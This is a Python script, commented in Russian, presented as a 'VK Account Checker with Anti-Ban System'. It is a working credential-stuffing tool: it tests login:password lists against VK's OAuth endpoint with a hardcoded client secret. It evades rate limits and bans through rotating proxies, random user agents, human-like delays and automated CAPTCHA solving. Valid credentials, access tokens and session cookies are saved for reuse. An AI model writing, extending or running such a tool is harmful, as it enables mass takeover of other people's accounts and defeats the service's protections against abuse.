import requests
import random
import time
import threading
from queue import Queue
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
import json
import os
import socket
import socks
from xevel import Xevel  # pip install xevel

# Инициализация Colorama
init(autoreset=True)

# Настройки
PROXY_FILE = "proxies.txt"
ACCOUNTS_FILE = "accounts.txt"
GOOD_FILE = "good.txt"
BAD_FILE = "bad.txt"
USER_AGENTS_FILE = "user_agents.txt"
THREADS = 3
DELAY = (5, 15)
TIMEOUT = 20
MAX_RETRIES = 2
MAX_ATTEMPTS_PER_ACCOUNT = 3

# Xevel settings
USE_XEVEL = False
XEVEL_API_KEY = "your_xevel_api_key"
XEVEL_TIMEOUT = 120  # Максимальное время ожидания решения капчи (сек)

# Глобальные переменные
proxies = []
accounts = []
good_accounts = []
bad_accounts = []
user_agents = []
lock = threading.Lock()
USE_PROXY = False
PROXY_TYPE = None
total_accounts = 0
checked_accounts = 0
working_proxies = []
xevel_client = None


def show_banner():
    print(Fore.RED + """
Developer by                                                               
░██████░███     ░███ ░█████████   ░██████                        
  ░██  ░████   ░████ ░██     ░██ ░██   ░██                       
  ░██  ░██░██ ░██░██ ░██     ░██       ░██  ░███████  ░████████  
  ░██  ░██ ░████ ░██ ░█████████    ░█████  ░██    ░██ ░██    ░██ 
  ░██  ░██  ░██  ░██ ░██   ░██         ░██ ░██    ░██ ░██    ░██ 
  ░██  ░██       ░██ ░██    ░██  ░██   ░██ ░██    ░██ ░██    ░██ 
░██████░██       ░██ ░██     ░██  ░██████   ░███████  ░██    ░██ 


y""")
    print(Fore.GREEN + "VK Account Checker with Anti-Ban System")
    print(Fore.MAGENTA + "=" * 50 + Style.RESET_ALL + "\n")


def load_user_agents():
    """Загружает юзер-агенты из файла или создает новый со свежими агентами"""
    global user_agents

    try:
        if os.path.exists(USER_AGENTS_FILE):
            with open(USER_AGENTS_FILE, 'r', encoding='utf-8') as f:
                user_agents = [line.strip() for line in f if line.strip()]
                print(Fore.CYAN + f"[i] Загружено {len(user_agents)} юзер-агентов из файла")
                return
    except Exception as e:
        print(Fore.YELLOW + f"[!] Ошибка загрузки юзер-агентов: {e}")

    # Актуальные юзер-агенты 2023-2025
    user_agents = [
        # Chrome Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",

        # Chrome MacOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",

        # Firefox Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",

        # Safari MacOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",

        # Edge
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",

        # Mobile User Agents
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",

        # Дополнительные современные агенты
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Whale/3.24.223.21 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Vivaldi/6.2.3105.58",
    ]

    # Сохраняем в файл для будущего использования
    try:
        with open(USER_AGENTS_FILE, 'w', encoding='utf-8') as f:
            f.write('\n'.join(user_agents))
        print(Fore.CYAN + f"[i] Создан файл с {len(user_agents)} юзер-агентами")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка сохранения юзер-агентов: {e}")


def ask_xevel_settings():
    """Настройки Xevel"""
    global USE_XEVEL, XEVEL_API_KEY, xevel_client

    use_xevel = input("Использовать Xevel для автоматического решения капчи? (y/n): ").lower()
    if use_xevel != 'y':
        return

    USE_XEVEL = True
    api_key = input(f"Введите API ключ Xevel (по умолчанию {XEVEL_API_KEY}): ").strip()
    if api_key:
        XEVEL_API_KEY = api_key

    try:
        xevel_client = Xevel(api_key=XEVEL_API_KEY)
        print(Fore.GREEN + "[+] Xevel успешно инициализирован")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка инициализации Xevil: {e}")
        USE_XEVEL = False


def solve_captcha_with_xevel(captcha_url):
    """Решает капчу с помощью Xevel"""
    if not USE_XEVEL or not xevel_client:
        return None

    try:
        print(Fore.CYAN + f"[i] Отправляем капчу в Xevil ({captcha_url})...")
        start_time = time.time()

        # Пытаемся решить капчу
        solution = xevel_client.solve(
            captcha_url,
            site_url="https://vk.com",
            timeout=XEVEL_TIMEOUT
        )

        if solution:
            solve_time = int(time.time() - start_time)
            print(Fore.GREEN + f"[+] Капча решена за {solve_time} сек: {solution}")
            return solution
        else:
            print(Fore.RED + "[-] Не удалось решить капчу")
            return None
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка Xevel: {e}")
        return None


def load_proxies_from_file():
    """Загружает прокси из файла"""
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
            print(Fore.CYAN + f"[i] Загружено {len(proxies)} прокси из файла")
            return proxies
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка загрузки прокси: {e}")
        return []


def test_proxy(proxy):
    """Тестирует прокси на работоспособность"""
    try:
        test_url = "https://api.vk.com/method/users.get?user_ids=1&v=5.131"

        if "@" in proxy:  # Прокси с авторизацией
            auth, hostport = proxy.split("@")
            host, port = hostport.split(":")
            username, password = auth.split(":")
            proxy_dict = {
                'http': f'{PROXY_TYPE}://{username}:{password}@{host}:{port}',
                'https': f'{PROXY_TYPE}://{username}:{password}@{host}:{port}'
            }
        else:
            host, port = proxy.split(":")
            proxy_dict = {
                'http': f'{PROXY_TYPE}://{host}:{port}',
                'https': f'{PROXY_TYPE}://{host}:{port}'
            }

        start_time = time.time()
        response = requests.get(test_url, proxies=proxy_dict, timeout=10)
        ping = int((time.time() - start_time) * 1000)

        if response.status_code == 200:
            print(Fore.GREEN + f"[+] Прокси {proxy} рабочий (ping: {ping}ms)")
            return (proxy, ping)
    except Exception as e:
        print(Fore.RED + f"[-] Прокси {proxy} не рабочий: {str(e)}")
    return None


def filter_working_proxies():
    """Фильтрует рабочие прокси и сортирует по скорости"""
    global working_proxies
    if not USE_PROXY:
        return []

    print(Fore.CYAN + "[i] Тестируем прокси (это может занять время)...")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        results = list(executor.map(test_proxy, proxies))

    working_proxies = [result[0] for result in results if result is not None]
    working_proxies.sort(key=lambda x: [r[1] for r in results if r and r[0] == x][0])

    print(Fore.CYAN + f"[i] Рабочих прокси: {len(working_proxies)}/{len(proxies)}")

    # Сохраняем рабочие прокси
    with open("working_proxies.txt", "w") as f:
        f.write("\n".join(working_proxies))

    return working_proxies


def ask_proxy_settings():
    """Настройки прокси"""
    global USE_PROXY, PROXY_TYPE

    use_proxy = input("Использовать прокси? (y/n): ").lower()
    if use_proxy != 'y':
        return

    USE_PROXY = True
    print("\nДоступные типы прокси:")
    print("1. HTTP/HTTPS (рекомендуется)")
    print("2. SOCKS4")
    print("3. SOCKS5")

    while True:
        choice = input("Выберите тип прокси (1/2/3): ")
        if choice == '1':
            PROXY_TYPE = 'http'
            break
        elif choice == '2':
            PROXY_TYPE = 'socks4'
            break
        elif choice == '3':
            PROXY_TYPE = 'socks5'
            break
        else:
            print(Fore.RED + "Неверный выбор, попробуйте снова")


def get_random_proxy():
    """Возвращает случайный рабочий прокси"""
    if not working_proxies or not USE_PROXY:
        return None

    # Выбираем из самых быстрых 25% прокси
    top_proxies = working_proxies[:max(1, len(working_proxies) // 4)]
    proxy = random.choice(top_proxies)

    if "@" in proxy:  # Прокси с авторизацией
        auth, hostport = proxy.split("@")
        host, port = hostport.split(":")
        username, password = auth.split(":")
        return {
            'http': f'{PROXY_TYPE}://{username}:{password}@{host}:{port}',
            'https': f'{PROXY_TYPE}://{username}:{password}@{host}:{port}'
        }
    else:
        host, port = proxy.split(":")
        return {
            'http': f'{PROXY_TYPE}://{host}:{port}',
            'https': f'{PROXY_TYPE}://{host}:{port}'
        }


def human_like_delay():
    """Имитирует человеческую задержку"""
    time.sleep(random.uniform(*DELAY))
    # Иногда делаем более длинную паузу
    if random.random() < 0.1:
        time.sleep(random.uniform(15, 30))


def save_session_cookies(session, login):
    """Сохраняет куки сессии"""
    try:
        cookies = session.cookies.get_dict()
        if not os.path.exists("cookies"):
            os.makedirs("cookies")
        with open(f"cookies/{login}_cookies.json", "w") as f:
            json.dump(cookies, f)
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка сохранения куков: {e}")


def load_session_cookies(login):
    """Загружает сохраненные куки сессии"""
    try:
        with open(f"cookies/{login}_cookies.json", "r") as f:
            return json.load(f)
    except:
        return None


def check_account_ban(login):
    """Проверяет, заблокирован ли аккаунт"""
    return False


def vk_auth(login, password, proxy=None, attempt=1):
    """Авторизация ВКонтакте с защитой от блокировки"""
    if attempt > MAX_ATTEMPTS_PER_ACCOUNT:
        return {"success": False, "error": "Max attempts reached"}

    if check_account_ban(login):
        return {"success": False, "error": "Account is banned"}

    session = requests.Session()
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }

    if proxy:
        session.proxies = proxy
        if PROXY_TYPE.startswith('socks'):
            host, port = proxy['http'].split('://')[1].split('@')[-1].split(':')
            socks.set_default_proxy(socks.SOCKS5, host, int(port))
            socket.socket = socks.socksocket

    try:
        # Пробуем загрузить сохраненные куки
        cookies = load_session_cookies(login)
        if cookies:
            session.cookies.update(cookies)
            test_params = {
                "user_ids": "1",
                "v": "5.131",
                "access_token": "none"
            }
            test_response = session.get(
                "https://api.vk.com/method/users.get",
                params=test_params,
                timeout=TIMEOUT
            )

            if "response" in test_response.json():
                return {
                    "success": True,
                    "token": "from_cookies",
                    "login": login,
                    "password": password
                }

        # Обычная авторизация
        params = {
            "grant_type": "password",
            "client_id": "2274003",
            "client_secret": "hHbZxrka2uZ6jB1inYsH",
            "username": login,
            "password": password,
            "v": "5.131",
            "2fa_supported": "1"
        }

        human_like_delay()

        response = session.get(
            "https://oauth.vk.com/token",
            params=params,
            headers=headers,
            timeout=TIMEOUT
        )
        data = response.json()

        # Обработка капчи
        if "error" in data and data.get("error") == "need_captcha":
            captcha_url = data["captcha_img"]
            captcha_sid = data["captcha_sid"]

            if USE_XEVEL:
                print(Fore.YELLOW + f"\n[!] Пытаюсь автоматически решить капчу для {login}")
                captcha_key = solve_captcha_with_xevel(captcha_url)
            else:
                print(Fore.YELLOW + f"\n[!] Требуется ввод капчи для {login}")
                print(Fore.YELLOW + f"[!] Откройте в браузере: {captcha_url}")
                captcha_key = input("Введите текст с капчи: ").strip()

            if captcha_key:
                params["captcha_sid"] = captcha_sid
                params["captcha_key"] = captcha_key
                time.sleep(random.uniform(2, 5))
                response = session.get(
                    "https://oauth.vk.com/token",
                    params=params,
                    headers=headers,
                    timeout=TIMEOUT
                )
                data = response.json()


        if "access_token" in data:
            save_session_cookies(session, login)
            return {
                "success": True,
                "token": data["access_token"],
                "login": login,
                "password": password
            }

        error_msg = data.get("error_description", "Unknown error")

        # Обработка блокировки
        if "blocked" in error_msg.lower() or "ban" in error_msg.lower():
            print(Fore.RED + f"\n[!] Аккаунт {login} возможно заблокирован!")
            with lock:
                bad_accounts.append(f"{login}:{password}:banned")
            return {"success": False, "error": "Account banned"}

        # Обработка слишком частых запросов
        if "too many" in error_msg.lower():
            print(Fore.YELLOW + f"\n[!] Слишком много запросов, увеличиваю задержку...")
            time.sleep(random.uniform(30, 60))
            return vk_auth(login, password, proxy, attempt + 1)

        return {"success": False, "error": error_msg}

    except requests.exceptions.RequestException as e:
        if attempt < MAX_RETRIES:
            print(Fore.YELLOW + f"\n[!] Ошибка соединения, повторная попытка {attempt}/{MAX_RETRIES}...")
            time.sleep(random.uniform(5, 10))
            return vk_auth(login, password, proxy, attempt + 1)
        return {"success": False, "error": f"Connection error: {str(e)}"}
    except Exception as e:
        return {"success": False, "error": f"Unexpected error: {str(e)}"}


def print_progress():
    """Отображает прогресс проверки"""
    global checked_accounts, total_accounts
    progress = checked_accounts / total_accounts * 100
    bar_length = 30
    filled_length = int(bar_length * checked_accounts // total_accounts)
    bar = '█' * filled_length + '-' * (bar_length - filled_length)
    print(Fore.CYAN + f"\rПрогресс: |{bar}| {progress:.1f}% ({checked_accounts}/{total_accounts})", end='')
    if checked_accounts == total_accounts:
        print()


def worker():
    """Рабочая функция для потоков"""
    global checked_accounts
    while True:
        try:
            login, password = accounts_queue.get_nowait()
        except:
            break

        proxy = get_random_proxy() if USE_PROXY else None
        result = vk_auth(login, password, proxy)

        with lock:
            if result["success"]:
                account_data = f"{result['login']}:{result['password']}:{result['token']}"
                print(Fore.GREEN + f"\n[+] VALID: {result['login']}:{result['password']}")
                good_accounts.append(account_data)
            else:
                print(Fore.RED + f"\n[-] INVALID: {login}:{password} | Ошибка: {result.get('error', 'Unknown')}")
                bad_accounts.append(f"{login}:{password}:{result.get('error', 'Unknown')}")

            checked_accounts += 1
            print_progress()

        human_like_delay()
        accounts_queue.task_done()


if __name__ == "__main__":
    # Создаем необходимые папки
    if not os.path.exists("cookies"):
        os.makedirs("cookies")

    show_banner()

    # Загружаем юзер-агенты
    load_user_agents()

    # Настройки Xevel
    ask_xevel_settings()

    # Настройки прокси
    ask_proxy_settings()

    # Загрузка прокси
    proxies = load_proxies_from_file() if USE_PROXY else []

    # Фильтрация рабочих прокси
    if USE_PROXY:
        working_proxies = filter_working_proxies()
        if not working_proxies:
            print(Fore.RED + "[-] Не найдено рабочих прокси! Продолжить без прокси? (y/n)")
            choice = input().lower()
            if choice != 'y':
                exit()
            USE_PROXY = False

    # Загрузка аккаунтов
    try:
        with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line.strip()]
            total_accounts = len(accounts)
            print(Fore.CYAN + f"[i] Загружено {total_accounts} аккаунтов")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка загрузки аккаунтов: {e}")
        exit()

    # Создаем очередь
    accounts_queue = Queue()
    for acc in accounts:
        accounts_queue.put(acc)

    # Начинаем проверку
    print(Fore.CYAN + f"\n[i] Начинаю проверку {total_accounts} аккаунтов с {THREADS} потоками...")

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    # Ожидаем завершения потоков
    for t in threads:
        t.join()

    # Ожидаем завершения очереди
    accounts_queue.join()

    # Сохраняем результаты
    if good_accounts:
        with open(GOOD_FILE, 'w', encoding='utf-8') as f:
            f.write('\n'.join(good_accounts))
        print(Fore.GREEN + f"\n[i] Найдено {len(good_accounts)} рабочих аккаунтов (сохранено в {GOOD_FILE})")

    if bad_accounts:
        with open(BAD_FILE, 'w', encoding='utf-8') as f:
            f.write('\n'.join(bad_accounts))
        print(Fore.YELLOW + f"[i] Найдено {len(bad_accounts)} нерабочих аккаунтов (сохранено в {BAD_FILE})")

    input("\nНажмите Enter для выхода...")